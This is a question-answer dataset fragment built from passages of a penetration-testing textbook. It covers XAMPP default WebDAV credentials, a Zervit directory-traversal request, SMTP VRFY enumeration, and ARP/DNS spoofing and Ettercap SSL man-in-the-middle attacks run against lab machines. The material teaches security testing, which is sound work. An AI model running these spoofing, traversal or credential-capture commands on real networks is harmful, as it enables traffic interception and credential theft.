    "summary": "This chapter covers methods for finding vulnerabilities during a penetration test. It discusses using tools like theHarvester and Maltego to gather information, Nmap for port scanning, and Nessus for automated vulnerability scanning. It also explains how to use Nmap's Scripting Engine (NSE) to run specific scripts that can identify vulnerabilities. Additionally, it introduces Metasploit's scanner modules and web application scanners like Nikto to detect issues in web applications. The text emphasizes the importance of combining automated tools with manual analysis to thoroughly assess a target's security."
  },
  {
    "start": 50,
    "end": 56,
    "text": "Use it to search for additional information about possible issues you find. Attacking XAMPP\nBrowsing to our Windows XP web server, we see at http://192.168.20.10/ that\nthe default web page announces itself as XAMPP 1.7.2. By default, XAMPP installations include phpMyAdmin, a database\nadministration web application. Ideally, phpMyAdmin would not be available\nFinding Vulnerabilities 149\nover the network, or at least it should require credentials to access it. But\non this version of XAMPP, the phpMyAdmin install at http://192.168.20.10\n/phpmyadmin/ is available and open. Even worse, phpMyAdmin gives us root\naccess on the same MySQL server that NSE told us we are unable to con-\nnect to. Using phpMyAdmin (as shown in Figure 6-15), we can bypass this\nrestriction and perform MySQL queries on the server. Figure 6-15: The open phpMyAdmin console complains quite loudly about the poor\nconfiguration. Default Credentials\nIn addition to its inclusion of phpMyAdmin, a Google search tells us\nthat XAMPP 1.7.3 and earlier come with Web Distributed Authoring and\nVersioning (WebDAV) software, which is used to manage files on a web\nserver over HTTP. XAMPP’s WebDAV installation comes with the default\nusername and password wampp:xampp. If these values aren’t changed, any-\none with access to WebDAV can log in, deface the website, and even pos-\nsibly upload scripts that will allow attackers to get a foothold on the system\nthrough the web server. And, as you can see in Figure 6-16, WebDAV is\nindeed present on this server. Figure 6-16: WebDAV install\nWe can use the tool Cadaver to interact with WebDAV servers. In\nListing 6-11, we use Cadaver to try to connect to the WebDAV server at\nhttp://192.168.20.10 and test the default credential set. 150 Chapter 6\nroot@kali:/# cadaver http://192.168.20.10/webdav\nAuthentication required for XAMPP with WebDAV on server `192.168.20.10':\nUsername: wampp\nPassword:\ndav:/webdav/> u\nListing 6-11: Using Cadaver\nThe Cadaver login is successful u. Our Windows XP target uses the\ndefault credentials for WebDAV, which we will be able to exploit. Now that\nwe have access to WebDAV, we can upload files to the web server. manual analysis\nSometimes, no solution will work nearly as well as manual vulnerability\nanalysis to see if a service will lead to a compromise, and there’s no better\nway to improve than practice. In the sections that follow we’ll explore some\npromising leads from our port and vulnerability scanning. Exploring a Strange Port\nOne port that has failed to come up in our automated scans is 3232 on our\nWindows target. If you try scanning this port with an Nmap version scan (as\nwe did at the end of Chapter 5), you’ll notice that it crashes. This behavior\nsuggests that the listening program is designed to listen for a particular\ninput and that it has difficulty processing anything else. This sort of behavior is interesting to pentesters, because programs\nthat crash when handling malformed input aren’t validating input properly. Recall from Chapter 5 that in the process of crashing the program, the out-\nput led us to believe that the software is a web server. Connecting to the port\nwith a browser, as shown in Figure 6-17, confirms this. Figure 6-17: Web server on port 3232\nThe web page served doesn’t tell us much, but from here we can con-\nnect to the port manually using Netcat. We know this is a web server, so we\nwill talk to it as such. We know we can browse to the default web page, so\nwe can enter GET / HTTP/1.1 to ask the web server for the default page (see\nListing 6-12). Finding Vulnerabilities 151\nroot@kali:~# nc 192.168.20.10 3232\nGET / HTTP/1.1\nHTTP/1.1 200 OK\nServer: Zervit 0.4 u\nX-Powered-By: Carbono\nConnection: close\nAccept-Ranges: bytes\nContent-Type: text/html\nContent-Length: 36\n<html>\n<body>\nhi\n</body>\n</html>root@bt:~#\nListing 6-12: Connecting to a port with Netcat\nThe server announces itself as Zervit 0.4 u. It doesn’t look good for the\nsoftware because the first autocomplete entry in a search for Zervit 0.4 on\nGoogle is “Zervit 0.4 exploit.” This web server software is subject to mul-\ntiple security issues, including a buffer overflow and a local file inclusion\nvulnerability, which allows us to serve other files on the system. This service\nis so sensitive that it may be best to avoid buffer overflow attacks, because\none false move will crash it. The local file inclusion, on the other hand,\nlooks promising. We know the server can process HTTP GET requests. For\nexample, we can download Windows XP’s boot.ini file by moving back five\ndirectories to the C drive using GET, as shown in Listing 6-13. root@kali:~# nc 192.168.20.10 3232\nGET /../../../../../boot.ini HTTP/1.1\nHTTP/1.1 200 OK\nServer: Zervit 0.4\nX-Powered-By: Carbono\nConnection: close\nAccept-Ranges: bytes\nContent-Type: application/octet-stream\nContent-Length: 211\n[boot loader]\ntimeout=30\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=\"Microsoft Windows XP Home\nEdition\" /fastdetect /NoExecute=OptIn\nListing 6-13: Local file inclusion in Zervit 0.4\nWe’re able to pull down boot.ini, a config file that tells Windows which\noperating system options to display at boot time. We’ll use this local file\ninclusion to pull down additional sensitive files in Chapter 8. 152 Chapter 6\nFinding Valid Usernames\nWe can drastically increase our chances of a successful password attack if\nwe know valid usernames for services. (We’ll explore this in more detail in\nChapter 9.) One way to find valid usernames for mail servers is to use the\nVRFY SMTP command, if it is available. As the name implies, VRFY verifies if a\nuser exists. NSE found the VRFY verb is enabled on the Windows XP target in\nthe previous chapter. Connect to TCP port 25 using Netcat, and use VRFY to\ncheck for usernames, as shown in Listing 6-14. root@kali:~# nc 192.168.20.10 25\n220 georgia.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here\nVRFY georgia\n250 Georgia<georgia@>\nVRFY john\n551 User not local\nListing 6-14: Using the SMTP VRFY command\nUsing VRFY we see that georgia is a valid username, but there is no user\ncalled john. We will look at using valid usernames to try to guess passwords\nin Chapter 9. summary\nIn this chapter, we have touched on various methods to find exploitable vul-\nnerabilities on our targets. Using a variety of tools and techniques, we were\nable to find myriad ways to go after our targets, including our trusty MS08-\n067 exploit against our Windows XP SMB server and a local file inclusion\nvulnerability on the Zervit 0.4 web server that will allow us to download\nsystem files. Using VRFY, we found a valid username that we can use in\npassword-guessing attacks on the mail server. We learned that the SLMail server may have a vulnerability in the\nPOP3 service based on its reported version number (though we were not\nable to find out for sure), and we found an open phpMyAdmin install on\nthe web server that gives us root access to the underlying database, as well\nas an XAMPP install with default credentials for WebDAV that will allow\nus to upload files to the web server. On the Linux target, we found an NFS\nshare with write access that allows us to write to a user’s .ssh directory, and\nwe discovered a not-readily-apparent TikiWiki install on the web server\nthat appears to contain a code execution vulnerability. The Vsftpd 2.3.4\nFTP server may have a hidden backdoor due to a compromise of the Vsftpd\nrepositories. At this point in the book we can see that our Windows XP and Linux\ntarget machines suffer from a lot of issues. The lack of attack surface on our\nWindows 7 target makes it seem pretty safe, but as we will see a bit later, that\nsolid exterior hides a few holes underneath. Before we move on to exploit-\ning these vulnerabilities, the next chapter will look at capturing traffic to\ngain sensitive information such as login credentials. Finding Vulnerabilities 153\n7\nCaPturing tr affiC\nBefore we move on to exploitation, we’ll use the\nWireshark monitoring tool, as well as other tools, to\nsniff and manipulate traffic to gain useful informa-\ntion from other machines on the local network. On\nan internal penetration test, when we’re simulating an\ninsider threat or an attacker who has breached the\nperimeter, capturing traffic from other systems in the network can give\nus additional interesting information (perhaps even usernames and pass-\nwords) that can help us with exploitation. The trouble is that capturing\ntraffic can produce a massive amount of potentially useful data. Capturing\nall traffic on just your home network could quickly fill several Wireshark\nscreens, and discovering which traffic is useful for a pentest can be difficult. In this chapter, we’ll look at several ways to manipulate a network to get\naccess to traffic we have no business being able to see. networking for Capturing traffic\nIf you find yourself in a network that uses hubs rather than switches, cap-\nturing traffic not intended for your machine will be easy, because when a\nnetwork hub receives a packet, it rebroadcasts it on all ports, leaving it up\nto each device to decide whom the packet belongs to. In a hubbed network,\ncapturing other systems’ traffic is as easy as selecting Use promiscuous mode\non all interfaces in Wireshark. This tells our Network Interface Controller\n(NIC) to grab everything it sees, which in a hubbed network will be every\npacket. Unlike hubs, switches send traffic only to the intended system, so on a\nswitched network, we won’t be able to view, for example, all the traffic to\nand from the domain controller without fooling the network into sending\nus that traffic. Most networks you encounter on pentests will probably be\nswitched networks; even some legacy network hardware that claims to be\na hub may have the functionality of a switch. Virtual networks seem to act like hubs, because all your virtual machines\nshare one physical device. If you capture traffic in promiscuous mode in\na virtual network, you may be able to see traffic from every virtual machine\nas well as the host machine, even if you are using a switch instead of a hub in\nyour environment. To simulate a non-virtualized network, we’ll turn off Use\npromiscuous mode on all interfaces in Wireshark, which means we will have\nto work a little harder to capture traffic from our target virtual machines. using wireshark\nWireshark is a graphical network protocol analyzer that lets us take a deep\ndive into the individual packets moving around the network. Wireshark\ncan be used to capture Ethernet, wireless, Bluetooth, and many other kinds\nof traffic. It can decode different protocols that it sees, so you could, for\ninstance, reconstruct the audio of Voice over IP (VoIP) phone calls. Let’s\ntake a look at the basics of using Wireshark to capture and analyze traffic. Capturing Traffic\nLet’s start by using Wireshark to capture traffic on our local network. Start Wireshark in Kali, as shown here. Click through any warnings about\nusing Wireshark as root being dangerous. root@kali:~# wireshark\nTell Wireshark to capture on the local network interface (eth0) by select-\ning Capture4Options, and selecting the eth0 option, as shown in Figure 7-1. Remember to uncheck the Use promiscuous mode on all interfaces option so\nthat the results will be like those on a physical switched network rather than\nthe VMware network. Exit the Options menu. Finally, click Capture4Start\nto begin the traffic capture. 156 Chapter 7\nYou should start to see traffic coming in, and you should be able to cap-\nture all traffic intended for the Kali machine as well as any broadcast traffic\n(traffic sent to the entire network).\n\nFigure 7-1: Starting a Wireshark capture\nTo illustrate the traffic we can capture in a switched network, let’s start\nby contacting our Windows XP target from our Kali machine over FTP. Log in as anonymous, as shown in Listing 7-1, to see the captured traffic in\nWireshark. (In the previous chapter, we discovered that the anonymous user\nis allowed on the Windows XP target. Although anonymous requires that you\nenter a password, it doesn’t matter what it is. Traditionally, it is an email\naddress, but the FTP server will accept whatever you would like to use.)\nroot@kali:~# ftp 192.168.20.10\nConnected to 192.168.20.10. 220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\nName (192.168.20.10:root): anonymous\n331 Password required for anonymous\nPassword:\n230 Logged on\nRemote system type is UNIX. ftp>\nListing 7-1: Logging in via FTP\nCapturing Traffic 157\nYou should see packets in Wireshark from the system with IP address\n\n192.168.20.9 to 192.168.20.10 and vice versa, with the Protocol field marked\nas FTP. Wireshark is capturing the traffic moving to and from our Kali\nmachine.\nSwitch over to your Ubuntu Linux target machine, and log in to the\nFTP server on the Windows XP target. Looking back at Wireshark in Kali,\nyou should see that no additional FTP packets have been captured. In our\nsimulated switched network, any traffic not destined for our Kali machine\nwill not be seen by the network interface and, thus, will not be captured by\nWireshark. (We’ll learn how to rectify this situation and capture other sys-\ntems’ traffic in “ARP Cache Poisoning” on page 160.)\nFiltering Traffic\nThe sheer volume of network traffic captured by Wireshark can be a bit\noverwhelming because, in addition to our FTP traffic, every other packet\nto or from the Kali system is captured. To find specific interesting packets,\nwe can use Wireshark filters. The Filter field is located at the top left of\nthe Wireshark GUI. As a very simple first Wireshark filtering example, let’s\nlook for all traffic that uses the FTP protocol. Enter ftp in the Filter field\nand click Apply, as shown in Figure 7-2.\nFigure 7-2: Filtering traffic in Wireshark\nAs expected, Wireshark filters the captured packets to show only those\nthat use the FTP protocol. We can see our entire FTP conversation, includ-\ning our login information, in plaintext.\n158 Chapter 7\nWe can use more advanced filters to further fine-tune the packets\nreturned. For example, we can use the filter ip.dst==192.168.20.10 to return\nonly packets with the destination IP address 192.168.20.10. We can even\nchain filters together, such as using the filter ip.dst==192.168.20.10 and ftp\nto find only FTP traffic destined for 192.168.20.10.\nFollowing a TCP Stream\nEven after filtering traffic, there may be multiple FTP connections captured\nduring the same time frame, so it could still be difficult to tell what’s going\non. But once we find an interesting packet, such as the beginning of an FTP\nlogin, we can dig deeper into the conversation by right-clicking the packet\nand selecting Follow TCP Stream, as shown in Figure 7-3.\nFigure 7-3: Following the TCP stream in Wireshark\nThe resulting screen will show us the full contents of our FTP connec-\ntion, including its credentials in plaintext, as shown in Listing 7-2.\n220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\nUSER anonymous\n331 Password required for anonymous\nPASS georgia@bulbsecurity.com\n230 Logged on\n\nSYST\n215 UNIX emulated by FileZilla\nListing 7-2: FTP login conversation\nCapturing Traffic 159\nDissecting Packets\nBy selecting a specific captured packet, we can get more information about\nthe captured data, as shown in Figure 7-4. At the bottom of the Wireshark\nscreen, you can see details of the selected packet. With a little guidance,\nWireshark will break down the data for you. For example, we can easily\nfind the TCP destination port by selecting the TCP entry and looking for\nDestination port, as highlighted in the figure. When we select this field,\nthe entry in the raw bytes of the packet is highlighted as well.\nFigure 7-4: Packet details in Wireshark\narP Cache Poisoning\nWhile it is nice to see the details of our own traffic, for pentesting purposes,\nit would be preferable to see the traffic that wasn’t intended for our Kali\nsystem. Perhaps we’ll be able to capture another user’s login session that\nuses an account other than anonymous to log in; that would give us working\ncredentials for the FTP server, as well as a set of credentials that might be\nreused elsewhere in the environment.\nTo capture traffic not intended for the Kali system, we need to find\nsome way to have the relevant data sent to our Kali system. Because the\nnetwork switch will send only packets that belong to us, we need to trick\nour target machine or the switch (or ideally both) into believing the traffic\nbelongs to us. We will perform a so-called man-in-the-middle attack, which\n160 Chapter 7\nwill allow us to redirect and intercept traffic between two systems (other\nthan our own system) before forwarding packets on to the correct destina-\ntion. One tried-and-true technique for masquerading as another device on\nthe network is called Address Resolution Protocol (ARP) cache poisoning (also\nknown as ARP spoofing).\nARP Basics\nWhen we connect to another machine on our local network, we usually\nuse its hostname, fully qualified domain name, or IP address. (We’ll look\nat domain name server cache poisoning in “DNS Cache Poisoning” on\npage 167.) Before a packet can be sent from our Kali machine to the\nWindows XP target, Kali must map the IP address of the XP target machine\nto the Media Access Control (MAC) address of the network interface card\n(NIC) so Kali knows where on the network to send the packet. To do this,\nit uses ARP to broadcast “Who has IP address 192.168.20.10?” on the local\nnetwork. The machine with the IP address 192.168.20.10 writes back, “I have\n\n192.168.20.10, and my MAC address is 00:0c:29:a9:ce:92.” In our case this\nwill be the Windows XP target. Our Kali system will store the mapping from\nIP address 192.168.20.10 to the MAC address 00:0c:29:a9:ce:92 in its ARP\ncache.\nWhen it sends the next packet, our machine will first look to its ARP\ncache for an entry for 192.168.20.10. If it finds one, it will use that entry\nas the address of the target rather than sending another ARP broadcast.\n(ARP cache entries are flushed out regularly because network topology may\nchange at any time.) Thus, systems will regularly be sending ARP broad-\ncasts as their caches are flushed. This process will come in handy when we\nperform ARP cache poisoning in the next section. The ARP process is illus-\ntrated in Figure 7-5.\nWho has 192.168.20.10? Who has 192.168.20.10?\nKali\n(192.168.20.9)\nI have 192.168.20.10.\nMy MAC address is\nUbuntu target Windows XP target\n00:0c:29:a9:ce:92.\n(192.168.20.11) (192.168.20.10)\nFigure 7-5: ARP resolution process\nCapturing Traffic 161\nTo view the ARP cache in our Kali machine, enter arp. Currently, the\nonly IP address–to–MAC address mappings that it knows are 192.168.20.1,\nthe default gateway, as well as 192.168.20.10, the Windows XP machine we\nengaged in the last exercise.\nroot@kali:~# arp\nAddress HWtype HWaddress Flags Mask Iface\n\n192.168.20.1 ether 00:23:69:f5:b4:29 C eth0\n\n192.168.20.10 ether 00:0c:29:05:26:4c C eth0\nNow restart the Wireshark capture, and use the anonymous login to\ninteract with the Ubuntu target’s FTP server again. Next, use the arp\nfilter, as shown in Figure 7-6, to see the ARP broadcast from the Kali\nmachine and the reply from the Ubuntu target with its MAC address.\nFigure 7-6: ARP broadcast and reply\nCheck your Kali Linux’s ARP cache again. You should see an entry for\n\n192.168.20.10.\nroot@kali:~# arp\nAddress HWtype HWaddress Flags Mask Iface\n\n192.168.20.1 ether 00:23:69:f5:b4:29 C eth0\n\n192.168.20.10 ether 00:0c:29:05:26:4c C eth0\n\n192.168.20.11 ether 80:49:71:14:97:2b C eth0\nThe trouble with relying on ARP for addressing is that there’s no guar-\nantee that the IP address–to–MAC address answer you get is correct. Any\nmachine can reply to an ARP request for 192.168.20.11, even if that machine\nis really at 192.168.20.12 or some other IP address. The target machine will\naccept the reply, regardless.\n162 Chapter 7\nThat’s ARP cache poisoning in a nutshell. We send out a series of ARP\nreplies that tell our target that we are another machine on the network.\nThus, when the target sends traffic intended for that machine, it will instead\nsend the packets straight to us to be picked up by our traffic sniffer, as shown\nin Figure 7-7.\nRecall from “Capturing Traffic” on page 156 that we initiated an FTP\nconnection from our Ubuntu target to the Windows XP target, but the traf-\nfic flowing through that connection was not captured by Wireshark on our\nKali system. Using an ARP cache poisoning attack, we can trick the two\nsystems into sending their traffic to our Kali machine instead, to be cap-\ntured in Wireshark.\nKali forwards Kali forwards traffic\ntraffic to Ubuntu. to Windows XP.\nKali\n(192.168.20.9)\nWindows XP sends traffic\ndestined for Ubuntu to Kali.\nUbuntu sends traffic destined\nUbuntu target for Windows XP to Kali. Windows XP target\n(192.168.20.11) (192.168.20.10)\nFigure 7-7: ARP cache poisoning redirects traffic through Kali.\nIP Forwarding\nBut before we can trick the Linux target into sending credentials for the\nFTP server to us instead, we need to turn on IP forwarding to tell our Kali\nmachine to forward any extraneous packets it receives to their proper desti-\nnation. Without IP forwarding, we’ll create a denial-of-service (DoS) condition\non our network, where legitimate clients are unable to access services. For\nexample, if we were to use ARP cache poisoning without IP forwarding to\nredirect traffic from the Linux target, intended for the Windows XP target,\nto our Kali machine, the FTP server on the Windows XP machine would\nnever receive the packets from the Linux machine and vice versa.\nThe setting for IP forwarding on Kali is in /proc/sys/net/ipv4/ip_forward.\nWe need to set this value to 1.\nroot@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\nCapturing Traffic 163\nBefore we start ARP cache poisoning, note the entry for the Windows\nXP target (192.168.20.10) in the Linux target’s ARP cache. This value will\nchange to the MAC address of the Kali machine after we commence ARP\ncache poisoning.\ngeorgia@ubuntu:~$ arp -a\n? (192.168.20.1) at 00:23:69:f5:b4:29 [ether] on eth2\n? (192.168.20.10) at 00:0c:29:05:26:4c [ether] on eth0\n? (192.168.20.9) at 70:56.81:b2:f0:53 [ether] on eth2\nARP Cache Poisoning with Arpspoof\nOne easy-to-use tool for ARP cache poisoning is Arpspoof. To use Arpspoof,\nwe tell it which network interface to use, the target of our ARP cache poi-\nsoning attack, and the IP address we would like to masquerade as. (If you\nleave out the target, you’ll poison the entire network.) For our example, to\nfool the Linux target into thinking we are the Windows XP machine, I set\nthe -i option as eth0 to specify the interface, the -t option as 192.168.20.11\nto specify the target as the Linux box, and 192.168.20.10 as the Windows XP\nmachine I want to pretend to be.\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.10\nArpspoof immediately starts sending ARP replies to the Linux target,\ninforming it that the Windows XP machine is located at the Kali machine’s\nMAC address. (ARP cache entries are updated at varying times among dif-\nferent implementations, but one minute is a safe length of time to wait.)\nTo capture the other side of the conversation, we need to fool the\nWindows XP machine into sending traffic intended for the Linux target to\nthe Kali machine as well. Start another instance of Arpspoof, and this time\nset the target as the Windows XP machine and the recipient as the Linux\nmachine.\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.10 192.168.20.11\nOnce you start ARP cache poisoning, check your Linux target’s ARP\ncache again. Notice that the MAC address associated with the Windows XP\ntarget has changed to 70:56:81:b2:f0:53. The Linux target should send all\ntraffic intended for the Windows XP target to the Kali machine, where we\ncan capture it in Wireshark.\ngeorgia@ubuntu:~$ arp -a\n? (192.168.20.1) at 00:23:69:f5:b4:29 [ether] on eth0\n? (192.168.20.10) at 70:56:81:b2:f0:53 [ether] on eth0\n164 Chapter 7\nNow log in to the Windows XP target’s FTP server from the Linux target\nusing another account (see Listing 7-3). (The credentials georgia:password\nwill work if you followed my instructions in Chapter 1. If you set your cre-\ndentials as something else, use those instead.)\ngeorgia@ubuntu:~$ ftp 192.168.20.10\nConnected to 192.168.20.10.\n220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\nName (192.168.20.10:georgia): georgia\n331 Password required for georgia\nPassword:\n230 Logged on\nRemote system type is UNIX.\nListing 7-3: Logging in to FTP on Windows XP from the Ubuntu target with a user account\nBecause we have IP forwarding turned on, everything appears to work\nnormally as far as our user is concerned. Returning to Wireshark, we see\nthat this time we were able to capture the FTP traffic and read the plaintext\nlogin credentials. The Wireshark output shown in Figure 7-8 confirms that\nour Kali machine is forwarding the FTP traffic between the two targets.\nAfter each FTP packet, there is a retransmission packet.\nFigure 7-8: Wireshark captures the login information.\nUsing ARP Cache Poisoning to Impersonate the Default Gateway\nWe can also use ARP cache poisoning to impersonate the default gateway\non a network and access traffic entering and leaving the network, includ-\ning traffic destined for the Internet. Stop the Arpspoof processes you have\nCapturing Traffic 165\nrunning, and try tricking the Linux target into routing all traffic to the\ngateway through the Kali machine by impersonating the default gateway,\nas shown here.\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.1\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.1 192.168.20.11\nIf we start to browse the Internet from the Linux target, we should see\nHTTP packets being captured by Wireshark. Even if sensitive information is\nencrypted with HTTPS, we’ll still be able to see where users are going and\nany other information sent over HTTP. For example, if we run a Google\nquery, the plaintext of the query will be captured in Wireshark, as shown in\nFigure 7-9.\nnote If you use ARP cache poisoning to trick a large network into thinking your pentest\nmachine is the default gateway, you may unwittingly cause networking issues. All the\ntraffic in a network going through one laptop (or worse, one virtual machine) can\nslow things down to the point of denial of service in some cases.\nFigure 7-9: Query captured in Wireshark\n166 Chapter 7\ndns Cache Poisoning\nIn addition to ARP cache poisoning, we can also poison Domain Name\nService (DNS) cache entries (mappings from domain names to IP addresses)\nto route traffic intended for another website to one we control. Just as ARP\nresolves IP to MAC addresses to properly route traffic, DNS maps (or\nresolves) domain names such as www.gmail.com to IP addresses.\nTo reach another system on the Internet or local network, our machine\nneeds to know the IP address to connect to. It is easy to remember the URL\nwww.gmail.com if we want to visit our web mail account, but it’s difficult to\nremember a bunch of IP addresses, which may even change regularly. DNS\nresolution translates the human-readable domain name into an IP address.\nFor example, we can use the tool Nslookup to translate www.gmail.com into an\nIP address, as shown in Listing 7-4.\nroot@kali~# nslookup www.gmail.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nwww.gmail.com canonical name = mail.google.com.\nmail.google.com canonical name = googlemail.l.google.com.\nName: googlemail.l.google.com\nAddress: 173.194.37.85\nName: googlemail.l.google.com\nAddress: 173.194.37.86\nListing 7-4: Nslookup DNS resolution\nAs you can see, Nslookup translates www.gmail.com to a number of IP\naddresses, including 173.194.37.85 and 173.194.37.86, all of which we can\nuse to reach Gmail. To perform DNS resolution (Figure 7-10), our system\nqueries its local DNS server for information about a specific domain name,\nsuch as www.gmail.com. If the DNS server has a cache entry for the address,\nit gives our system the correct IP address. If not, it contacts other DNS serv-\ners on the Internet looking for the correct information.\nWhen the correct IP address is returned, the DNS server writes back\nto our machine with the correct IP address resolution for www.gmail.com,\nand our system then translates www.gmail.com into 173.194.37.85, as shown\nin Listing 7-4. Users can then access www.gmail.com by name without having\nto use the IP address.\nCapturing Traffic 167\nwww.gmail.com\nis at 173.194.37.85.\nDNS server www.gmail.com\nInternet\nI don’t know\nBrowse to www.gmail.com.",
    "question": "What are the vulnerabilities related to the availability of phpMyAdmin and WebDAV on the XAMPP installation, and how can they be exploited?",
    "summary": "This chapter discusses methods to capture and analyze network traffic to gain sensitive information. It covers using Wireshark to monitor traffic, ARP cache poisoning to redirect traffic between systems, and DNS cache poisoning to route traffic to controlled servers. These techniques help identify vulnerabilities and extract credentials during penetration testing."
  },
  {
    "start": 57,
    "end": 59,
    "text": "173.194.37.85. I’ll ask another\nDNS server.\nI want to browse to\nwww.gmail.com.\nWhat’s the IP address?\nKali www.gmail.com local DNS server\nis at 173.194.37.85.\nFigure 7-10: DNS resolution\nGetting Started\nDNS cache poisoning works like ARP cache poisoning: We send a bunch\nof bogus DNS resolution replies pointing to the wrong IP address for a\ndomain name.\nNow make sure the Apache server is running with the command service\napache2 start.\nroot@kali:~# service apache2 start\n* Starting web server apache2 [ OK ]\nBefore we use a DNS cache poisoning tool, we need to create a file that\nspecifies which DNS names we would like to spoof and where to send traffic.\nFor example, let’s tell any system that runs a DNS resolution for www.gmail\n.com that that domain’s IP address is our Kali machine by adding the entry\n168 Chapter 7\n\n192.168.20.9 www.gmail.com to a new file called hosts.txt. (You can name the\nfile anything you like.)\nroot@kali:~# cat hosts.txt\n\n192.168.20.9 www.gmail.com\nUsing Dnsspoof\nRestart Arpspoof between the Linux target and the default gateway and\nvice versa as discussed in “Using ARP Cache Poisoning to Impersonate the\nDefault Gateway” on page 165. Now we can start sending DNS cache poi-\nsoning attempts using the Dnsspoof DNS spoofing tool, as shown here.\nroot@kali:~# dnsspoof -i eth0u -f hosts.txtv\ndnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.20.9]\n\n192.168.20.11 > 75.75.75.75.53: 46559+ A? www.gmail.com\nWe specify the network interface u to use, and point Dnsspoof to the\nfile (hosts.txt) we just created v telling it which values to spoof. Once Dnsspoof is running, when we run the nslookup command from\nour Linux target, the IP address returned should be our Kali machine’s, as\nshown in Listing 7-5. This is clearly not the real IP address for Gmail. georgia@ubuntu:~$ nslookup www.gmail.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nName: www.gmail.com\nAddress: 192.168.20.9\nListing 7-5: Nslookup after attack\nTo demonstrate this attack, set up a website to direct traffic to. The\nApache server in Kali will by default serve an “It Works” page to anyone\nwho visits it. We can change the contents of the index.html file in the folder\n/var/www, but the default “It Works” text is fine for our purposes. Now if we browse to http://www.gmail.com/ from the Ubuntu target, the\nURL bar should say http://www.gmail.com/, but we’re actually at our Kali\nmachine’s web server, as shown in Figure 7-11. We can even make this attack\nmore interesting by cloning the actual Gmail website (or any other site the\nattacker chooses) so the user won’t notice the difference. Capturing Traffic 169\nFigure 7-11: This isn’t Gmail. ssL attacks\nSo far, we’ve been able to intercept encrypted traffic, but we haven’t been\nable to get any sensitive information out of the encrypted connection. For\nthis next attack, we’ll rely on a user’s willingness to click past an SSL certifi-\ncate warning to perform a man-in-the-middle attack and get the plaintext\nout of a Secure Sockets Layer (SSL) connection, which encrypts traffic to\nprotect it from being read by an eavesdropper. SSL Basics\nThe goal of SSL is to provide reasonable assurance that any sensitive infor-\nmation (such as credentials or credit card numbers) transmitted between\na user’s browser and a server is secure—unable to be read by a malicious\nentity along the way. To prove that the connection is secure, SSL uses cer-\ntificates. When you browse to an SSL-enabled site, your browser asks the\nsite to identify itself with its SSL certificate. The site presents its certifi-\ncate, which your browser verifies. If your browser accepts the certificate, it\ninforms the server, the server returns a digitally signed acknowledgment,\nand SSL-secured communication begins. 170 Chapter 7\nAn SSL certificate includes an encryption key pair as well as identifying\ninformation, such as the domain name and the name of the company that\nowns the site. A server’s SSL certificate is generally vouched for by a certifi-\ncate authority (CA) such as VeriSign or Thawte. Browsers come preinstalled\nwith a list of trusted CAs, and if a server’s SSL certificate is vouched for by\na trusted CA, the browser can create a secure connection. If the certificate\nis untrusted, the user will be presented with a warning that basically says,\n“The connection might be secure, but it might not be. Proceed at your\nown risk.”\nUsing Ettercap for SSL Man-in-the-Middle Attacks\nIn our ARP cache poisoning attack, we man-in-the-middled the traffic\nbetween our Windows XP and Ubuntu targets (as well as the Ubuntu tar-\nget and the Internet). These systems were still able to communicate with\neach other, but our Kali system was able to capture the traffic. We can do\nthe same thing to attack SSL traffic. We can break the secure SSL connec-\ntion by redirecting traffic to and from www .facebook.com to our Kali system\nso we can intercept sensitive information. For this example, we’ll use Ettercap, a multifunction suite for man-in-\nthe-middle attacks that, in addition to SSL attacks, can also complete all\nof the attacks we have performed so far with Arpspoof and Dnsspoof. Turn\noff any other spoofing tools before starting Ettercap. See page 22 for con-\nfiguration instructions. Ettercap has multiple interfaces, but we will use the -T option for the\ntext-based interface in this example. Use the -M option with arp:remote\n/gateway/ /target/ to set up an ARP cache poisoning attack between the\ndefault gateway and the Linux target, as shown next. The actual attack\nwill work the same way as our previous exercise with Arpspoof. root@kali:~# ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/\nWith Ettercap running, we just wait for users to start interacting with\nSSL-based web servers. Switch over to your Linux target, and attempt to log\nin to a website using SSL. You should be greeted with a certificate warning\nlike the one in Figure 7-12. Because this is a man-in-the-middle attack, the SSL session’s security\ncannot be verified. The certificate Ettercap presents isn’t valid for www\n.facebook.com, so the trust is broken, as illustrated in Figure 7-13. But security warnings don’t stop all users. If we click through the warn-\ning and enter our credentials, Ettercap will grab them in plaintext before\nforwarding them on to the server, as shown here:\nHTTP : 31.13.74.23:443 -> USER: georgia PASS: password INFO: https://www.facebook.com/\nCapturing Traffic 171\nFigure 7-12: Facebook cannot be verified. www.facebook.com\nHTTPS response from\nwww.facebook.com\nHTTPS request for\nwww.facebook.com\nHTTPS request for\nInternet\nwww.facebook.com\nUbuntu target Kali\nHTTPS response from\nwww.facebook.com\n(certificate from Ettercap is\ninvalid for www.facebook.com)\nFigure 7-13: SSL man-in-the-middle attack\n172 Chapter 7\nssL stripping\nOf course, the trouble with SSL man-in-the-middle attacks is that users have\nto click through the SSL certificate warning. Depending on the browser,\nthis can be an involved process that is difficult, if not impossible, for a user\nto ignore. Most readers can probably think of a time they clicked through a\nsecurity warning and continued to the page despite their better judgment. (Case in point: Our default Nessus install uses Tenable’s self-signed certifi-\ncate, which throws a certificate error when you browse to the web interface. If you chose to follow along with that example, you most likely decided to\nclick through the warning.)\nIt is difficult to say how effective certificate warnings are at stopping\nusers from visiting HTTPS sites without valid certificates. I have run social-\nengineering tests that employed self-signed SSL certificates, and the success\nrate has been significantly lower than those with valid 